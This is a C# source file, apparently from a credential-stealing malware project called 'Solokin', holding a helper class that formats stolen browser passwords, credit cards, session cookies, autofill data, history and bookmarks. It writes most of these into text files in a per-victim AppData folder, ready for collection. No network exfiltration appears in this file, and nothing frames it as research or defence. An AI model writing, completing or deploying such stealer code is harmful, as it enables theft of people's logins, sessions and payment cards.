using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static Solokin_V2._1.Common;

namespace Solokin_V2._1
{
    internal sealed class BrowserUtils
    {
        private static string FormatPassword(Password password)
        {
            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n",
                password.hostname, password.username, password.password);
        }
        private static string FormatCreditCard(CreditCard cc)
        {
            return String.Format("Number: {0}\nExp: {1}\nHolder: {2}\n\n",
                cc.number, cc.expmonth + "/" + cc.expyear, cc.name);
        }
        private static string FormatCookie(Cookie cookie)
        {
            return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n",
                cookie.hostname, cookie.path, cookie.expiresutc, cookie.name, cookie.value);
        }
        private static string FormatAutoFill(AutoFill autofill)
        {
            return String.Format("{0}\t\n{1}\t\n\n", autofill.name, autofill.value);
        }
        private static string FormatHistory(Site history)
        {
            return String.Format("### {0} ### \"{1}\", Visits: {2}, Date: {3}\n", history.title, history.hostname, history.visits, history.date);
        }
        private static string FormatBookmark(Bookmark bookmark)
        {
            return String.Format("### {0} ### \"{1}\", Added ({2})\n", bookmark.title, bookmark.hostname, bookmark.added);
        }

        public static bool ShowCookies(List<Cookie> Cookies)
        {
            string path = Program.AppData + "\\" + $"{Environment.UserDomainName}" + "\\" + "Browsers" + "\\" + "Cookies.txt";

            try
            {
                using (StreamWriter writer = new StreamWriter(path))
                {
                    // Write each string in the list to a new line in the file
                    foreach (Cookie Cookie in Cookies)
                    {
                     
                        writer.WriteLine(FormatCookie(Cookie));
                    }
                }
                    
                 

                return true;
            }
            catch { return false; }
        }

        public static bool ShowAutoFill(List<AutoFill> Autofills)
        {
            string path = Program.AppData + "\\" + $"{Environment.UserDomainName}" + "\\" + "Browsers" + "\\" + "Autofill.txt";
            try
            {
              
                    using (StreamWriter writer = new StreamWriter(path))
                    {
                    foreach (AutoFill Autofill in Autofills)
                    {
                        writer.WriteLine(FormatAutoFill(Autofill));
                    }
                    }


                return true;
            }
            catch { return false; }
        }

        public static bool ShowHistory(List<Site> HistoryItems)
        {
            try
            {
                foreach (Site History in HistoryItems)
                    Console.WriteLine(FormatHistory(History));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowBookmarks(List<Bookmark> Bookmarks)
        {
            try
            {
                foreach (Bookmark Bookmark in Bookmarks)
                    Console.WriteLine(FormatBookmark(Bookmark));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowPasswords(List<Password> Passwords)
        {
            string path = Program.AppData + "\\" + $"{Environment.UserDomainName}" + "\\" + "Browsers" + "\\" + "Passwords.txt";


            try
            {
                using (StreamWriter writer = new StreamWriter(path))
                {

                    foreach (Password Password in Passwords)
                    {
                        if (Password.username == "" || Password.password == "")
                            continue;



                        writer.WriteLine(FormatPassword(Password));

                    }

                }


                return true;
            }
            catch { return false; }
        }

        public static bool ShowCreditCards(List<CreditCard> CreditCards)
        {
            string path = Program.AppData + "\\" + $"{Environment.UserDomainName}" + "\\" + "Browsers" + "\\" + "Credit Cards.txt";
            try
            {

                using (StreamWriter writer = new StreamWriter(path))
                {

                    foreach (CreditCard CreditCard in CreditCards)
                    {
                        writer.WriteLine(FormatCreditCard(CreditCard));
                    }
                       



                        

                    

                }

                foreach (CreditCard CreditCard in CreditCards)
                    Program.Passwords = FormatCreditCard(CreditCard);
                   


                return true;
            }
            catch { return false; }
        }

    }
}
